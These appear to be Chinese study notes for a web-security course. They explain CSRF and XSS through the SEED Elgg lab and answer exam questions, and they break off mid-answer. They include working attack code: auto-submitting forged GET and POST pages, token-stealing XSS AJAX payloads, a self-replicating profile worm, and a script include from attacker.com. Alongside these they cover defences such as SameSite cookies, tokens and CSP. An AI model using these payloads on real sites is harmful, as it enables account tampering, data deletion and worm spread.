# CSRF总结

## 1. 核心概念 (Core Concepts)

### 定义与成因
**CSRF (Cross-Site Request Forgery)**：攻击者诱导受害者访问恶意网页，该网页利用受害者的身份（浏览器自动携带的 Cookie）向目标网站发送伪造请求。

*   **本质**：服务器无法区分请求是用户“自愿发起”的（点击按钮）还是“被动发起”的（浏览器加载恶意资源）。
*   **根源**：浏览器处理**跨站请求**的机制——自动附加目标域的 **Cookies**。

### 跨站请求 vs 同站请求
*   **同站请求 (Same-site)**：发起页面的域 == 目标请求的域。
*   **跨站请求 (Cross-site)**：发起页面的域 != 目标请求的域（例如：`attacker.com` 请求 `bank.com`）。
    *   **关键行为**：虽然浏览器知道这是跨站请求，但为了维持 Web 功能（如嵌入图片），默认仍会携带目标域的 Cookies。

### 攻击三要素
1.  **目标网站**：存在 CSRF 漏洞（无防御措施）。
2.  **受害者**：**必须**在目标网站处于**登录状态**（拥有活跃的 Session Cookie）。
3.  **恶意网站**：攻击者控制，用于存放伪造请求的代码。

---

## 2. 针对 HTTP GET 服务的攻击

**特点**：参数包含在 URL 中。
**攻击载体**：HTML 标签（如 `<img>`, `<iframe>`），无需 JavaScript 即可触发。

### 攻击思路
利用浏览器解析 HTML 标签时自动请求 `src` 属性的特性。

### 代码示例：伪造转账请求
假设转账 URL 为：`http://www.bank32.com/transfer.php?to=3220&amount=500`

**恶意网页代码 (`attacker.html`)：**
```html
<html>
<body>
  <h1>You verify a prize!</h1>
  <!-- 浏览器加载此标签时，自动发送 GET 请求，并携带 bank32 的 Cookie -->
  <img src="http://www.bank32.com/transfer.php?to=3220&amount=500" 
       width="1" height="1" />
</body>
</html>
```

### 案例：Elgg 添加好友 (GET)
**背景**：
*   User: Alice (Victim), Samy (Attacker, ID=42).
*   Target: `http://www.seed-server.com/action/friends/add?friend=42`

**攻击构建**：
1.  Samy 在恶意服务器 `attacker32.com` 托管页面。
2.  Alice 登录 Elgg 后访问该恶意页面。
3.  `<img>` 标签触发请求，Elgg 服务器收到请求 + Alice 的 Cookie，认为 Alice 想要添加 Samy 为好友。

---

## 3. 针对 HTTP POST 服务的攻击

**特点**：参数包含在 HTTP 请求体 (Body) 中，URL 中不可见。
**误区**：很多人认为 POST 比 GET 安全，因为不能直接用 `<img>` 标签。
**攻击载体**：**JavaScript** + **隐形表单 (Hidden Form)**。

### 攻击思路
无法直接通过 HTML 标签属性发送 POST 数据，必须使用 DOM 操作创建一个表单，设置参数，并自动提交。

### 代码示例：Elgg 修改个人资料 (POST)
**背景**：
*   Target URL: `http://www.seed-server.com/action/profile/edit`
*   Goal: 修改 Alice 的 "Description" 字段为 "SAMY is MY HERO"。

**恶意网页代码 (JavaScript 实现):**
```html
<html>
<body>
<h1>Please wait...</h1>
<script type="text/javascript">
function forge_post()
{
   var fields;
   // 构造表单参数
   fields = "<input type='hidden' name='name' value='Alice'>";
   fields += "<input type='hidden' name='description' value='SAMY is MY HERO'>"; 🅰
   fields += "<input type='hidden' name='accesslevel[description]' value='2'>"; 
   fields += "<input type='hidden' name='guid' value='39'>";                    🅱

   // 动态创建 form 元素
   var p = document.createElement("form");
   p.action = "http://www.seed-server.com/action/profile/edit";
   p.innerHTML = fields;
   p.method = "post";
   
   // 将表单加入文档并提交
   document.body.appendChild(p);
   p.submit();                                                                  🅲
}

// 页面加载完毕即触发
window.onload = function() { forge_post();}
</script>
</body>
</html>
```

**代码解析**：
*   🅰 **Payload**：攻击者想要注入的数据。
*   🅱 **GUID**：受害者 (Alice) 的 ID。攻击者需预先调查获取（查看 Alice 主页源码）。
*   🅲 **自动提交**：`p.submit()` 模拟用户点击提交按钮。由于是在 Alice 的浏览器中执行，请求会自动带上 Alice 的 Session Cookie。
*   **Hidden 属性**：`type='hidden'` 保证表单对用户不可见，虽有一闪而过的跳转，但攻击已完成。

---

## 4. 攻击实施的关键前提 (Exam Point)

在考试或分析中，判断 CSRF 攻击是否成立，必须检查以下条件：

1.  **同源策略 (SOP) 不适用**：CSRF 是**跨站发送请求**，不是**跨站读取响应**。
    *   攻击者**能**发送请求（Fire and forget）。
    *   攻击者**不能**读取服务器返回的响应（受同源策略限制，攻击者页面无法读取目标域的响应内容）。
    *   *这一点区分了 CSRF 和 XSS。*

2.  **Session 有效性**：
    *   受害者必须在同一浏览器容器中登录了目标网站，且 Session 未过期。
    *   如果是无状态的认证（如将 Token 放在 HTTP Header 中而不是 Cookie），标准的 CSRF 无效（因为浏览器只自动发 Cookie，不自动发自定义 Header）。

3.  **参数的可预测性**：
    *   攻击者必须知道伪造请求的所有参数名和值（如 user ID, amount 等）。如果请求中包含随机数（不可预测），攻击则失效（这也是防御的核心）。

这是 CSRF 笔记的第二部分，重点涵盖防御机制及其底层原理。这部分内容通常是考试中关于“如何修复”或“原理辨析”的核心考点。


## 5. 防御核心逻辑
**问题根源**：服务器仅仅依赖 Cookies 来验证用户身份，而浏览器会自动为跨站请求附加 Cookies，导致服务器无法区分请求是“用户自愿”还是“跨站伪造”。
**解决思路**：引入浏览器无法自动伪造的“第三类信息”，用于辅助判断请求来源。

---

## 6. 基于 HTTP 头部的防御: Referer

### 机制
检查 HTTP 请求头中的 `Referer` 字段。该字段记录了请求发起的源页面 URL。

### 逻辑判断
```python
# 伪代码逻辑
referer = request.headers.get('Referer')
host = request.headers.get('Host')

if extract_domain(referer) == host:
    return "Allowed (Same-Site)"
else:
    return "Blocked (Cross-Site)"
```

### 缺陷 (Exam Point)
1.  **隐私泄露**：Referer 会暴露用户的浏览轨迹。
2.  **不可靠**：为了保护隐私，浏览器或防火墙可能剥离或修改 Referer 头。如果服务器强制要求 Referer，会导致合法用户无法访问；如果不强制，攻击者可设法通过 `<meta name="referrer" content="no-referrer">` 绕过检查。

---

## 7. 浏览器级防御: 同站 Cookie (SameSite Cookie)

### 机制
在服务器设置 `Set-Cookie` 时，增加 `SameSite` 属性。控制浏览器在跨站请求时是否携带该 Cookie。

### 三种模式
1.  **None**：旧行为。无论跨站还是同站，只要目标匹配，统统带上 Cookie（需要 Secure 属性）。
2.  **Strict**：**最严**。任何跨站请求（包括点击链接跳转）都**不**携带 Cookie。
    *   *缺点*：用户体验差（如从百度点进知乎，显示未登录）。
3.  **Lax** (现代浏览器默认)：**折中方案**。
    *   **允许携带**：会导致“顶级导航”（Top-Level Navigation）的 **GET** 请求（如 `<a>` 链接跳转，`window.location`）。
    *   **禁止携带**：所有 **POST** 请求；所有嵌入式子请求（如 `<img>`, `<iframe>` 加载）。

### 实验验证逻辑 (Exam Scenarios)
假设 `cookie-lax` 设置为 `SameSite=Lax`，`cookie-normal` 无设置。目标网站为 `bank.com`。

| 场景 | 请求类型 | 行为 | 结果 |
| :--- | :--- | :--- | :--- |
| **链接点击** | GET | 顶级导航 | **携带** Lax Cookie (允许用户从外部登录状态跳转) |
| **表单提交** | GET | 顶级导航 | **携带** Lax Cookie |
| **表单提交** | **POST** | 数据修改 | **丢弃** Lax Cookie -> **防御 CSRF 成功** |
| **图片加载** | GET | 子资源 | **丢弃** Lax Cookie -> **防御 CSRF 成功** |

> **关键结论**：`SameSite=Lax` 能够有效防御基于 POST 的 CSRF 和基于隐蔽 GET（如 img 标签）的 CSRF，同时保留了正常的超链接跳转体验。

---

## 8. 应用级防御: 秘密令牌 (Secret Token)

这是目前最通用、最可靠的防御手段（Golden Standard）。

### 核心原理
在 HTTP 请求的数据字段中（而非 Cookie 中）加入一个**随机的、不可预测的**令牌。
*   **同站请求**：页面 JS 或表单可以读取本域的 Token 并放入请求中。
*   **跨站请求**：攻击者无法读取目标域的页面内容（受**同源策略 SOP** 保护），因此无法获取 Token 值，伪造的请求会被服务器拒绝。

### 实现方式
1.  **生成**：服务器为每个会话（Session）生成唯一的随机 Token，存储在服务端 Session 中。
2.  **注入**：用户访问页面时，服务器将 Token 嵌入到 HTML 的隐藏字段或 JS 变量中。
    ```html
    <form action="/transfer" method="POST">
        <input type="hidden" name="csrf_token" value="Z7UD-8765-R43D..."> 
        <!-- 其他字段 -->
    </form>
    ```
3.  **验证**：服务器接收请求时，比对 `POST body 中的 token` 与 `Session 中的 token`。

### 为什么 Cookie 不能替代 Token？
*   **Cookie**：浏览器**自动**发送。攻击者不需要知道 Cookie 内容，只要发请求，浏览器就会带上。
*   **Token**：必须**手动**放入请求体。攻击者因为 SOP 读不到 victim 页面源码，所以拿不到 Token，也就无法构造合法的请求体。

---

## 9. 案例分析: Elgg 的防御措施

Elgg 作为一个成熟的 CMS，使用了双重令牌验证机制。

### 令牌结构
Elgg 在请求中要求携带两个参数：
1.  `__elgg_ts`：时间戳 (Timestamp)。
2.  `__elgg_token`：根据 Session ID、时间戳、站点密钥生成的 MD5 哈希。

### 验证逻辑 (PHP)
```php
// 简化版逻辑
$token = get_input('__elgg_token');
$ts = get_input('__elgg_ts');
$session_id = session_id();

// 重新计算预期 Token
$expected_token = md5($site_secret . $ts . $session_id);

if ($token === $expected_token && validate_timestamp($ts)) {
    return true; // 请求合法
} else {
    return false; // CSRF 攻击，拒绝
}
```

### 攻击失效原因
攻击者在 `attacker.com` 构造表单时，无法预知 `Alice` 登录状态下的 `__elgg_token`。如果攻击者尝试通过 JS (`XMLHttpRequest`) 去请求 Elgg 页面获取 Token，会被浏览器的**同源策略**拦截响应，导致攻击者依然拿不到 Token。

> **Lab Note**: 在实验环境中，我们通过在 `Csrf.php` 的 `validate` 函数开头添加 `return;` 强行禁用了这个检查，才使得攻击得以复现。

---

## 10. 特殊场景：IoT 与 WebSocket (Advanced)

### 动态密码缺陷
部分 IoT 设备要求请求携带“动态密码”（类似于 Token）。
*   **防护**：如果使用 AJAX 获取密码，SOP 会阻止跨站 JS 读取密码，防御有效。
*   **漏洞**：**WebSocket** 不受 SOP 同源策略限制！

### Cable Haunt 漏洞
1.  **场景**：电缆调制解调器在内网运行 WebSocket 服务。
2.  **攻击**：恶意网页发起 WebSocket 连接到设备 IP。由于 WebSocket 握手不受 SOP 限制，且设备未检查 `Origin` 头，攻击者可建立连接并控制设备。
3.  **启示**：Token 机制必须配合 SOP 才能生效；对于不受 SOP 限制的协议（如 WebSocket），必须在服务端严格检查 `Origin` 头。

---

## 总结：防御对比表

| 防御措施 | 核心机制 | 优点 | 缺点/局限 |
| :--- | :--- | :--- | :--- |
| **Referer Check** | 检查 HTTP 头来源 | 简单，服务器端配置 | 隐私问题，易被篡改或剥离，不可靠 |
| **SameSite Cookie** | 浏览器阻止发送 Cookie | 浏览器原生支持，性能好 | 旧浏览器不支持；Lax 模式下 GET 仍有风险(虽小) |
| **Secret Token** | 要求请求体携带随机数 | **最安全**，不依赖 Cookie 行为 | 开发成本高，需确保页面注入 Token 且无 XSS 漏洞 |

**最终结论**：生产环境中通常结合使用 **SameSite Cookie** (作为第一道防线) 和 **Secret Token** (作为核心防御) 来确保安全。

# CSRF题目
![[Pasted image 20251208161649.png]]
### **W2.1. Explain why the same-site cookie can help prevent CSRF attacks.**
**题目转述：** 解释为什么 Same-site cookie（同站 Cookie）有助于防止 CSRF 攻击。

**解答：**
**Same-site cookie** 是一种 Cookie 属性（attribute），它允许服务器声明某个 Cookie 是否应该随跨站请求（Cross-site requests）一起发送。
*   **原理：** CSRF 攻击的核心在于浏览器会自动将目标网站的 Cookie 附加到攻击者伪造的跨站请求中。
*   **防御机制：** 如果将 Cookie 设置为 `SameSite=Strict` 或 `SameSite=Lax`，浏览器在检测到请求是从第三方网站（如攻击者的恶意页面）发起时，就不会发送该 Cookie。
*   **结论：** 既然 Cookie 没有被发送，服务器就无法验证用户的身份（看起来像是一个未登录的用户发起的请求），请求会被拒绝，从而有效地阻断了 CSRF 攻击。

---

### **W2.2. Explain how a website can use secret token to prevent CSRF attacks, and why does it work?**
**题目转述：** 解释网站如何使用 Secret Token（秘密令牌）来防止 CSRF 攻击，以及它为什么有效？

**解答：**
*   **如何使用：** 服务器在渲染包含敏感操作的页面（如表单）时，会生成一个随机的、不可预测的字符串（即 Secret Token），并将其嵌入到页面中（通常作为 hidden form field 隐藏字段）。当用户提交表单时，这个 Token 会随数据一起发送给服务器。服务器会验证提交的 Token 是否与生成的 Token 一致。
*   **为什么有效：**
    *   **同源策略（Same-Origin Policy）：** 攻击者的恶意网站虽然可以向目标网站发送请求，但由于浏览器的同源策略，攻击者无法读取目标网站页面的内容（即无法读取到这个随机生成的 Token）。
    *   **无法伪造：** 由于 Token 是随机且不可预测的，攻击者无法猜测出正确的值。
    *   因此，伪造的请求中缺少正确的 Token，服务器会拒绝处理该请求。

---

### **W2.3. These days, most of the websites use HTTPS, instead of HTTP. Do we still need to worry about CSRF attacks?**
**题目转述：** 如今大多数网站使用 HTTPS 而非 HTTP。我们还需要担心 CSRF 攻击吗？

**解答：**
**需要。**
*   **HTTPS 的作用：** HTTPS 旨在加密通信通道，防止数据在传输过程中被窃听或篡改（防御中间人攻击），并验证服务器的身份。
*   **CSRF 的本质：** CSRF 攻击利用的是服务器对浏览器发送的凭证（Cookies）的**自动信任**，以及浏览器自动发送 Cookie 的机制。
*   **结论：** HTTPS 并没有改变浏览器的 Cookie 发送机制。即使在 HTTPS 下，如果用户访问了恶意页面，浏览器仍然会自动将目标网站的 Cookie 发送到目标服务器。因此，HTTPS 不能防御 CSRF。

---

### **W2.4. GET Request Attack Construction**
**题目转述：** 使用 LiveHTTPHeader 发现某网站使用 GET 请求删除页面（仅拥有者可删除）。
URL: `http://www.example.com/delete.php?pageid=5`
请构建一个简单的恶意网页，当受害者访问时，会向 `www.example.com` 发起伪造请求以删除页面。

**解答：**
对于 GET 类型的 CSRF 攻击，最简单的方法是利用 HTML 标签（如 `<img>`），因为浏览器渲染这些标签时会自动发起 GET 请求。

**恶意网页代码示例：**
```html
<html>
  <body>
    <h1>正在加载图片...</h1>
    <!-- 这是一个恶意标签，实际上发起了删除请求 -->
    <img src="http://www.example.com/delete.php?pageid=5" width="0" height="0" border="0">
  </body>
</html>
```
当受害者访问此页面时，浏览器尝试加载该图片，从而向 `example.com` 发送带 Cookie 的 GET 请求，导致页面被删除。

---

### **W2.5. POST Request Attack Construction**
**题目转述：** 使用 LiveHTTPHeader 发现某网站使用 POST 请求删除页面。
URL: `http://www.example.com/delete.php`
Body: `pageid=5`
请构建一个简单的恶意网页，当受害者访问时，会向 `www.example.com` 发起伪造请求以删除页面。

**解答：**
对于 POST 类型的 CSRF 攻击，通常需要构建一个隐藏表单，并使用 JavaScript 自动提交。

**恶意网页代码示例：**
```html
<html>
  <body>
    <h1>请稍候...</h1>
    <!-- 构建指向目标URL的表单 -->
    <form action="http://www.example.com/delete.php" method="POST" id="csrf_form">
      <!-- 填入必要的参数 -->
      <input type="hidden" name="pageid" value="5">
    </form>

    <!-- 使用JavaScript自动提交表单 -->
    <script type="text/javascript">
      document.getElementById("csrf_form").submit();
    </script>
  </body>
</html>
```
当受害者访问此页面时，JavaScript 会立即执行，以 POST 方式提交表单，携带用户的 Cookie 完成攻击。

---

### **W2.6. Finding Boby's User ID (Elgg)**
**题目转述：** 针对 Elgg 的攻击需要 Boby 的 User ID (guid)。如果 Alice 想攻击 Boby，但不知道他的密码无法登录他的账户。请描述 Alice 如何找到 Boby 的 User ID。

**解答：**
Alice 可以通过公开信息获取 Boby 的 User ID，因为 ID 通常不是秘密数据：
1.  **访问个人主页：** Alice 可以访问 Boby 在 Elgg 上的公开个人资料页面。URL 中通常会包含 ID，例如 `http://www.example.com/elgg/profile/1234`，其中的 `1234` 就是 GUID。
2.  **查看源代码：** 在 Boby 的个人主页或他发布的帖子页面，右键查看网页源代码（View Source），搜索关键词（如 "guid" 或 "user_id"），通常可以在 JavaScript 变量或隐藏字段中找到。
3.  **检查链接：** 鼠标悬停在 Boby 的头像或名字上，浏览器的状态栏显示的链接地址中通常包含该 ID。
4.  **好友列表：** 如果 Alice 在 Boby 的好友列表中，或者能看到他的好友列表，相关链接中也会暴露 ID。

---

![[Pasted image 20251208161701.png]]
### **W2.7. Random User ID validation**
**题目转述：** 在请求中有一个 User ID，这是服务器生成的随机数。ID 信息可以在用户的页面上找到。如果攻击者不知道这个 User ID，他/她还能发起 CSRF 攻击吗？

**解答：**
**一般不能。**
*   如果在请求中必须包含这个随机生成的 User ID，并且服务器会验证该 ID 的正确性，那么这个 ID 的作用就类似于 CSRF Token。
*   由于同源策略（SOP），攻击者在恶意页面上无法读取受害者在目标网站上的页面内容（也就无法获取这个随机 ID）。
*   如果攻击者无法猜测或获取该 ID，伪造的请求就会因为参数错误或校验失败而被服务器拒绝。

---

### **W2.8. Attack Unknown Victim (Elgg)**
**题目转述：** 如果 Alice 想攻击任何访问她恶意网页的人。此时她事先不知道谁会访问。(1) 她能发起 CSRF 攻击修改受害者的 Elgg 个人资料吗？(2) 她能发起 CSRF 攻击将自己添加到受害者的好友列表吗？请解释。

**解答：**
1.  **修改个人资料 (Modify Profile):** **通常不能 (取决于实现)。**
    *   在 Elgg 中，修改资料的 POST 请求通常包含被修改用户的 GUID 作为参数。因为 Alice 不知道访问者（受害者）是谁，她无法在恶意代码中预先填入正确的 GUID。如果服务器依赖这个参数来决定修改谁的资料，攻击会失败。
2.  **添加好友 (Add Friend):** **可以。**
    *   添加好友的请求逻辑通常是：“当前登录用户（受害者）请求添加某人（Alice）为好友”。
    *   这个请求的参数中包含的是**目标好友的 ID**（即 Alice 的 ID）。Alice 知道自己的 ID，所以她可以构建一个请求，参数为 `friend_id=Alice_ID`。
    *   当受害者访问时，受害者的浏览器会发送“添加 Alice 为好友”的请求，这不需要 Alice 预先知道受害者的 ID。

---

### **W2.9. Session ID in Data Part vs. Cookie**
**题目转述：** Web 应用要求请求不仅在 Cookie 中携带 Session ID，还要在数据部分（URL 或 POST payload）携带 Session ID。这听起来很冗余。但通过检查数据部分是否有 Session ID，服务器可以判断是否为跨站请求。请解释原因。

**解答：**
*   **Cookie 的自动性：** 浏览器会自动将 Cookie 附加到任何发送给目标域名的请求中（包括跨站请求）。攻击者无法阻止 Cookie 发送，也无法读取 Cookie 的内容。
*   **数据部分的手动性：** 将 Session ID 放入数据部分（如表单字段）需要 JavaScript 显式地去读取 Session ID 并填入。
*   **同源策略的限制：** 攻击者在恶意网站上无法读取目标网站的 Cookie 或 DOM（因为跨域）。因此，攻击者无法获取受害者的 Session ID 来填入表单的数据部分。
*   **结论：** 如果请求的数据部分缺少 Session ID 或者与 Cookie 中的 ID 不匹配，服务器就知道这不是由受信任的同源页面生成的请求，从而判定为 CSRF 攻击。这实际上就是**Double Submit Cookie** 模式的一种变体。

---

### **W2.10. Do browsers know whether an HTTP request is cross-site or not?**
**题目转述：** 浏览器知道 HTTP 请求是否是跨站的吗？

**解答：**
**知道。**
浏览器非常清楚请求的发起方（Origin，即恶意页面所在的域）和请求的目标方（Target，即目标服务器所在的域）。浏览器正是基于此来执行**同源策略（Same-Origin Policy）**，并决定是否阻止脚本读取响应，以及决定如何填充 `Origin` 和 `Referer` 头部。

---

### **W2.11. Do servers know whether an HTTP request is cross-site or not?**
**题目转述：** 服务器知道 HTTP 请求是否是跨站的吗？

**解答：**
**不一定（默认不知道）。**
HTTP 协议本身是无状态的。当服务器收到一个请求时，如果只看请求本身（不依赖特定的 Header 如 Referer/Origin），它无法区分这个请求是用户点击本站按钮发出的，还是由第三方恶意网站发出的。服务器必须依靠额外的检查（如检查 `Referer` 头、`Origin` 头或 CSRF Token）来推断请求的来源。

---

### **W2.12. Why cannot a web server use the referer header to tell whether a request is cross-site or not?**
**题目转述：** 为什么 Web 服务器不能（仅）使用 Referer 头部来判断请求是否跨站？

**解答：**
虽然 `Referer` 头部可以指示请求来源，但它不可靠：
1.  **隐私保护：** 出于隐私考虑，部分浏览器、防火墙或用户设置可能会剥离或禁用 `Referer` 头部。
2.  **协议转换：** 从 HTTPS 页面跳转到 HTTP 页面时，标准规定浏览器不应发送 `Referer`。
3.  **伪造风险：** 虽然现代浏览器很难通过 JS 伪造 Referer，但在某些旧环境或非浏览器环境下可能被篡改。
如果服务器强制验证 Referer，可能会导致合法用户的正常请求被拒绝。

---

### **W2.13. Why is it important for a server to know whether a request is cross-site or not?**
**题目转述：** 为什么服务器知道请求是否跨站很重要？

**解答：**
为了区分**用户意愿**和**攻击者意愿**。
*   如果是**同站**请求，通常意味着用户在与网站 UI 进行交互，是合法的操作。
*   如果是**跨站**请求，尤其是在涉及敏感操作（如转账、改密）时，很可能是攻击者在后台悄悄发起的 CSRF 攻击。
*   只有识别出跨站请求，服务器才能拒绝处理这些潜在的恶意操作，从而保护用户数据。

---

### **W2.14. Can we simply ask browsers not to attach any cookie for cross-site requests?**
**题目转述：** 我们能否简单地要求浏览器不在跨站请求中附加任何 Cookie？

**解答：**
在过去，简单地“一刀切”是不行的，因为这会破坏许多合法的 Web 功能，例如：
*   **单点登录（SSO）：** 用户在 A 站登录后访问 B 站需要携带 Cookie。
*   **第三方小部件：** 如社交媒体的“点赞”按钮、嵌入的地图或支付网关，它们需要读取用户的第三方 Cookie 才能正常工作。

**补充：** 现在的 `SameSite` Cookie 属性允许更精细的控制。将 `SameSite` 设为 `Lax` 或 `Strict` 确实是要求浏览器限制跨站 Cookie 的发送，但设为 `None` 则允许（需配合 Secure）。所以现在是可以做到的，但不能默认强制所有 Cookie 都这样，否则会破坏现有 Web 生态。

---

### **W2.15. ★ ★ ★ iFrame and Facebook**
**题目转述：** 如果 `www.example.com` 的页面包含一个 iframe，iframe 里面显示的是 Facebook 页面。如果请求是从 iframe **内部**发送的，这被视为跨站请求吗？如果不是，如何保证安全？

**解答：**
1.  **是否跨站：** **不是。**
    *   请求是从 iframe 内部（源为 `facebook.com`）发往 `facebook.com` 的。对于 Facebook 服务器来说，源和目标都是 Facebook，属于**同源请求（Same-origin request）**。
    *   注意：这里的前提是请求是由 iframe 内的逻辑（如用户点击 iframe 内的按钮）触发的。

2.  **如何保证安全（防御 Clickjacking）：**
    *   这种场景的主要威胁不是 CSRF，而是**点击劫持（Clickjacking/UI Redressing）**。攻击者（`example.com`）可以将 iframe 设为透明，诱导用户点击，实际上用户点击的是 Facebook 页面上的按钮（如“删除账号”）。
    *   **防御方法：** Facebook 服务器应在 HTTP 响应头中发送 **`X-Frame-Options`**（设为 `DENY` 或 `SAMEORIGIN`）或 **CSP (Content Security Policy)** 的 `frame-ancestors` 指令。
    *   这会告诉浏览器：不允许 `example.com` 将 `facebook.com` 嵌入到 iframe 中。如果浏览器检测到违规，会拒绝加载 iframe 内容，从而避免攻击。

# Cross-Site Scripting (XSS) 跨站脚本攻击

## 核心概念

**定义**：XSS 是一种代码注入攻击。攻击者向目标网站注入恶意脚本（通常是 JavaScript），当其他用户浏览该网页时，脚本在**受害者的浏览器**中执行。

**根源**：Web 应用程序混淆了**数据**（Data）和**代码**（Code）。HTML 允许将 script 标签嵌入数据中，浏览器无法区分哪些是合法的应用代码，哪些是用户注入的恶意代码。

**XSS vs CSRF**：
*   **CSRF**：借用用户的权限发送请求（跨站）。攻击者无法获取响应内容。
*   **XSS**：在用户上下文中执行代码（同站）。攻击者**可以读取**页面内容（如 Cookie、CSRF Token）、篡改 DOM、伪造请求。

## XSS 类型

### 1. 非持久型 (Reflected XSS)
*   **机制**：用户输入的数据被服务器立即反射回响应页面中（例如错误信息、搜索结果）。
*   **载体**：恶意脚本通常包含在 URL 参数中。
*   **攻击流程**：攻击者诱导用户点击恶意链接 -> 服务器反射脚本 -> 浏览器执行。
```markup
http://www.example.com/search?input=<script>alert("attack");</script>
```

### 2. 持久型 (Stored XSS)
*   **机制**：恶意脚本被永久存储在目标服务器的数据库中（例如论坛帖子、个人资料、评论）。
*   **载体**：存储在服务器端的数据。
*   **攻击流程**：攻击者提交恶意数据 -> 任何访问该页面的用户都会加载并执行脚本。
*   **危害**：无需诱导点击链接，攻击范围广，可形成蠕虫。

---

## 攻击实战 (Elgg 案例)

### 1. 基础注入验证
在输入框（如 Profile Description）输入：
```html
<script>alert("XSS");</script>
```
若弹出窗口，说明存在 XSS 漏洞。

### 2. 绕过 CSRF 防御 (读取 Token)
在 XSS 攻击中，JavaScript 运行在受害者当前页面，因此可以读取 DOM 中的 CSRF Token (`__elgg_ts`, `__elgg_token`)。这是 XSS 比 CSRF 更强大的地方。

**Elgg 页面中的 Token 存储方式 (JS 对象):**
```javascript
var elgg = {
  "security":{
      "token":{
          "__elgg_ts":1543676484,
          "__elgg_token":"alg7OIvw5Md6iJbXFVgtDA"
      }
  }
  // ...
};
```

### 3. 构造 AJAX 请求 (添加好友/修改资料)
利用 `XMLHttpRequest` 在后台悄悄发送 HTTP 请求，用户无感知。

```javascript
<script type="text/javascript">
window.onload = function () {
    // 1. 获取 CSRF Token (XSS 的关键能力)
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    // 2. 构造 Payload (添加好友 ID=47)
    var sendurl = "http://www.seed-server.com/action/friends/add" 
                  + "?friend=47" + token + ts;

    // 3. 发送 AJAX 请求
    var Ajax = new XMLHttpRequest();
    Ajax.open("GET", sendurl, true);
    Ajax.send();
}
</script>
```

**修改个人资料 (POST 请求):**
POST 请求需要设置 `Content-Type` 并将数据放在 body 中。
```javascript
// ... 获取 token 和 ts 同上 ...
var content = token + ts + "&name=" + elgg.session.user.name + 
              "&description=Samy is my hero" + "&accesslevel[description]=2"; // 2=Public

var Ajax = new XMLHttpRequest();
Ajax.open("POST", "http://www.seed-server.com/action/profile/edit", true);
Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
Ajax.send(content);
```

---

## XSS 蠕虫 (Self-Propagation)

蠕虫的特性是**自我复制**：受害者被感染后，其个人资料被修改，且修改后的内容包含**恶意代码本身**，从而感染下一个查看者。

### 方法 1: DOM 方法 (读取自身代码)
利用 ID 标记 script 标签，通过 DOM API 读取自身内容并注入。

```html
<!-- 给 script 标签加 ID -->
<script id="worm" type="text/javascript">
window.onload = function(){
    // 1. 获取自身的代码字符串
    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
    var jsCode = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script>"; // 拆分字符串防止闭合错误
    
    // 2. URL 编码 (重要！因为要放入 HTTP POST 数据中)
    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

    // 3. 将自身代码拼接到 payload 中
    var desc = "&description=Samy is my hero" + wormCode;
    // ... 发送 AJAX 请求修改 Profile (同上) ...
}
</script>
```

### 方法 2: 链接方法 (src 引用)
代码体量小，核心逻辑放在外部服务器。
```html
<script type="text/javascript" src="http://attacker.com/xssworm.js"></script>
```
*   **JS 文件内容**: 必须包含生成上述 `<script src...>` 标签字符串并写入 Profile 的逻辑。

---

## 防御措施

### 1. 编码 (Output Encoding) - 首选
将用户输入中的特殊字符转换为 HTML 实体。浏览器将其渲染为文本而非代码。
*   `<` 转换为 `&lt;`
*   `>` 转换为 `&gt;`
*   `"` 转换为 `&quot;`
*   **PHP 函数**: `htmlspecialchars()`

### 2. 过滤 (Input Filtering) - 次选
尝试删除恶意代码（如 `<script>`）。
*   **缺点**: 难以完全覆盖（例如 `onclick`, `onerror`, `javascript:` 伪协议），容易被绕过。
*   **建议**: 使用成熟库（如 `HTMLawed`, `jsoup`）而非手写正则。

### 3. 内容安全策略 (CSP, Content Security Policy) - 根本解决
通过 HTTP 响应头告诉浏览器**哪些源（Origin）的代码是可信的**。强制分离代码与数据。

**HTTP Header 示例**:
```http
Content-Security-Policy: default-src 'self'; script-src 'self' trusted.com;
```

**CSP 规则类型**:
1.  **禁止内联 (Disallow Inline)**: 默认禁止 `<script>...</script>` 和 `<div onclick="...">`。强制代码必须从外部文件加载。
2.  **白名单 (Whitelist)**: 仅允许加载特定域名的 JS 文件。
3.  **Nonce (随机数)**: 允许特定的内联代码块，前提是必须包含匹配的随机数。

**Nonce 机制**:
*   服务器生成一个随机数 `nonce-value`，放在 CSP 头中。
*   HTML 中的 script 标签必须包含 `<script nonce="nonce-value">`。
*   攻击者无法预测随机数，因此注入的 `<script>` 无法执行。

**CSP 配置示例 (Apache)**:
```apache
<VirtualHost *:80>
    Header set Content-Security-Policy "script-src 'self' 'nonce-RANDOM_VALUE'"
</VirtualHost>
```

### 总结
*   **攻击本质**: 利用 HTML 混合代码数据的特性，注入 JS。
*   **危害**: 窃取 Cookie/Token，DOM 操作，蠕虫传播。
*   **核心防御**: 输出编码 (Encoding) + CSP (禁止内联/限制源)。

# XSS题目

![[Pasted image 20251208161923.png]]![[Pasted image 20251208161935.png]]![[Pasted image 20251208161941.png]]

### **W3.1. 编写恶意 JavaScript 发起 GET 请求**

**题目转述**：
通过 LiveHTTPHeader 发现，删除页面的操作是一个发送到 `www.example.com` 的 GET 请求：
`GET /delete.php?pageid=5`
请编写一个恶意的 JavaScript 程序，当被注入到受害者的页面中时，可以删除受害者拥有的页面。

**解答**：
由于这是一个 GET 请求，我们可以通过创建一个 `Image` 对象或者使用 `XMLHttpRequest` 来触发。

```javascript
// 方法一：使用 Image 对象 (最简单的方法，不需要处理响应)
var img = new Image();
img.src = "http://www.example.com/delete.php?pageid=5";

// 方法二：使用 XMLHttpRequest (AJAX)
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/delete.php?pageid=5", true);
xhr.send();
```

---

### **W3.2. 编写恶意 JavaScript 发起 POST 请求**

**题目转述**：
通过 LiveHTTPHeader 发现，删除页面的操作是一个发送到 `www.example.com` 的 POST 请求：
`POST /delete.php`，Body 内容为 `pageid=5`。
请编写一个恶意的 JavaScript 程序，当被注入到受害者的页面中时，可以删除受害者拥有的页面。

**解答**：
对于 POST 请求，必须使用 `XMLHttpRequest` (Ajax) 或者动态构建一个 Form 表单并提交。

```javascript
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/delete.php", true);
// 设置 Content-Type 头部，模拟表单提交
